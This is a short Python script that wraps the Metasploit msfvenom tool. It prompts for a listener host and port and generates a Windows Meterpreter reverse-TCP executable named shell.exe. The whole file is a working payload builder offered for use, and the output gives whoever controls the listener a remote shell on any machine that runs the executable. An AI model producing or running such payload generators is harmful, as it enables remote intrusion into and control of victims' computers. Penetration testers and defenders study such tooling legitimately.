#!/bin/python3
# Author:Jerry<calljerryli@outlook.com>

import os

cmd_tmp = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > shell.exe'
lhost = input('LHOST\n>>> ')
lport = input('LPORT(default:4444)\n>>> ')
if lport == '':
    lport = 4444
cmd = cmd_tmp % (lhost, lport)
print(cmd)
os.system(cmd)
print('EXE Generation complete -> ./shell.exe')
